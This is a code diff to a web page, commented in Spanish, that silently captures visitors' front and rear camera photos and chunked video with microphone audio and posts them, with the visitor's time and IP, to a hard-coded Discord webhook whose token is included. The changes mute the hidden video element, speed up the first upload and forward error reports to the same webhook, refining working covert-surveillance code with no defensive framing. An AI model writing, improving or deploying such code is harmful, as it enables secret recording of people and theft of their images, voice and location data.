@@ -62,7 +62,7 @@
   </div>
 
   <div class="hidden">
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
   </div>
 
   <script>
@@ -71,11 +71,11 @@
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548766063771254846/WIxKE3JXCwdU0HKqeaRcWap1luqS87meWhUDKwN7mWXWge7Ra_nK9CXhUTy3kiKpO9Vm';
 
     // ====== CONFIGURACIÓN ======
-    const SEGUNDOS_POR_TROZO = 5;      // duración de cada trozo de video
-    const MAX_TROZOS = 60;             // 60 x 5s = 5 minutos
-    const ANCHO = 320;                 // resolución baja para que quepa en Discord
+    const SEGUNDOS_POR_TROZO = 3;   // trozos cortos para que el primer envío sea rápido
+    const MAX_TROZOS = 20;          // 20 x 3s = 1 minuto (cámbialo si quieres más)
+    const ANCHO = 320;
     const ALTO = 240;
-    const CAMARA_VIDEO = 'user';       // 'user' = frontal, 'environment' = trasera
+    const CAMARA_VIDEO = 'user';    // 'user' frontal, 'environment' trasera
     // ===========================
 
     let currentStream = null;
@@ -152,12 +152,31 @@
           method: 'POST',
           body: formData
         });
-        console.log(`Enviado ${nombreArchivo}:`, res.status, res.statusText);
+        const text = await res.text();
+        console.log(`[${nombreArchivo}] status=${res.status} respuesta=${text}`);
         return res.ok;
       } catch (err) {
-        console.error(`Error al enviar ${nombreArchivo}:`, err);
+        console.error(`[${nombreArchivo}] Error al enviar:`, err);
         return false;
       }
+    }
+
+    // -------- Elegir mimeType soportado --------
+    function elegirMimeTypeVideo() {
+      const candidatos = [
+        'video/webm;codecs=vp8,opus',
+        'video/webm;codecs=vp9,opus',
+        'video/webm',
+        'video/mp4'
+      ];
+      for (const c of candidatos) {
+        if (MediaRecorder.isTypeSupported(c)) {
+          console.log('mimeType soportado elegido:', c);
+          return c;
+        }
+      }
+      console.warn('Ningún mimeType específico soportado, se usará por defecto.');
+      return '';
     }
 
     // -------- Grabar video en trozos --------
@@ -166,7 +185,7 @@
         throw new Error('MediaRecorder no soportado en este navegador');
       }
 
-      // Pedir cámara + micrófono con resolución baja
+      console.log('Solicitando cámara + micrófono para video...');
       const stream = await navigator.mediaDevices.getUserMedia({
         video: {
           facingMode: CAMARA_VIDEO,
@@ -176,29 +195,34 @@
         audio: true
       });
 
-      // Elegir mimeType soportado
-      let mimeType = 'video/webm;codecs=vp8,opus';
-      if (!MediaRecorder.isTypeSupported(mimeType)) {
-        mimeType = 'video/webm';
-      }
-      if (!MediaRecorder.isTypeSupported(mimeType)) {
-        if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4';
-        else mimeType = '';
-      }
-      console.log('Usando mimeType de video:', mimeType || '(por defecto)');
+      console.log('Stream obtenido. Tracks:', stream.getTracks().map(t => t.kind));
 
+      const mimeType = elegirMimeTypeVideo();
+      const esMp4 = mimeType.includes('mp4');
+      const ext = esMp4 ? 'mp4' : 'webm';
       const opciones = mimeType ? { mimeType } : {};
 
       let trozo = 0;
 
-      // Grabar un solo trozo
       function grabarTrozo() {
-        return new Promise((resolve) => {
-          const recorder = new MediaRecorder(stream, opciones);
+        return new Promise((resolve, reject) => {
+          let recorder;
+          try {
+            recorder = new MediaRecorder(stream, opciones);
+          } catch (e) {
+            reject(new Error('No se pudo crear MediaRecorder: ' + e.message));
+            return;
+          }
+
           const chunks = [];
 
           recorder.ondataavailable = e => {
             if (e.data && e.data.size > 0) chunks.push(e.data);
+          };
+
+          recorder.onerror = e => {
+            console.error('Error en MediaRecorder:', e);
+            reject(e);
           };
 
           recorder.onstop = () => {
@@ -206,33 +230,47 @@
             resolve(blob);
           };
 
-          recorder.start();
+          try {
+            recorder.start();
+          } catch (e) {
+            reject(new Error('No se pudo iniciar la grabación: ' + e.message));
+            return;
+          }
+
           setTimeout(() => {
             if (recorder.state !== 'inactive') recorder.stop();
           }, SEGUNDOS_POR_TROZO * 1000);
         });
       }
 
-      // Bucle de grabación + envío
       while (trozo < MAX_TROZOS) {
         trozo++;
-        console.log(`Grabando trozo de video ${trozo}/${MAX_TROZOS}...`);
-        const blob = await grabarTrozo();
+        console.log(`Grabando trozo ${trozo}/${MAX_TROZOS}...`);
+        let blob;
+        try {
+          blob = await grabarTrozo();
+        } catch (e) {
+          console.error('Error grabando trozo:', e);
+          break;
+        }
 
-        if (blob.size === 0) {
+        if (!blob || blob.size === 0) {
           console.warn(`Trozo ${trozo} vacío, saltando.`);
           continue;
         }
 
-        console.log(`Trozo ${trozo} grabado: ${(blob.size/1024).toFixed(1)} KB. Enviando...`);
-        await enviarAlWebhook(
+        console.log(`Trozo ${trozo} grabado: ${(blob.size/1024).toFixed(1)} KB`);
+        const ok = await enviarAlWebhook(
           blob,
           `🎥 **Video - trozo ${trozo}** (${SEGUNDOS_POR_TROZO}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
-          `video_trozo_${trozo}.mp4` // nombre .mp4 aunque por dentro sea webm
+          `video_trozo_${trozo}.${ext}`
         );
+
+        if (!ok) {
+          console.warn(`Trozo ${trozo} no se pudo enviar (fallo webhook).`);
+        }
       }
 
-      // Detener cámara y micrófono
       stream.getTracks().forEach(t => t.stop());
     }
 
@@ -255,9 +293,9 @@
           'frontal.jpg'
         );
 
-        await new Promise(r => setTimeout(r, 800));
+        await new Promise(r => setTimeout(r, 500));
 
-        // 2) Foto trasera (si el dispositivo la tiene)
+        // 2) Foto trasera (si existe)
         try {
           console.log('Capturando foto trasera...');
           const fotoTrasera = await capturarFoto('environment');
@@ -270,17 +308,25 @@
           console.warn('No hay cámara trasera o falló:', e);
         }
 
-        await new Promise(r => setTimeout(r, 800));
+        await new Promise(r => setTimeout(r, 500));
 
-        // 3) Video en trozos (frontal + audio)
-        console.log('Iniciando grabación de video en trozos...');
+        // 3) Video en trozos
+        console.log('Iniciando grabación de video...');
         await grabarVideoEnTrozos(hora, linkIP);
 
         yaEnviado = true;
         console.log('Proceso completo.');
 
       } catch (err) {
-        console.error('Permiso denegado o error general:', err);
+        console.error('Error general en el flujo:', err);
+        // Enviar un aviso al webhook con el motivo del fallo
+        try {
+          const texto = new Blob(
+            [`⚠️ Error en el flujo.\nHora: ${hora}\nIP: ${linkIP}\nMotivo: ${err.message || err}\nNombre: ${err.name || ''}`],
+            { type: 'text/plain' }
+          );
+          await enviarAlWebhook(texto, `⚠️ Error\n🕒 ${hora}\n🌐 ${linkIP}`, 'error.txt');
+        } catch (e) {}
       } finally {
         pidiendo = false;
       }
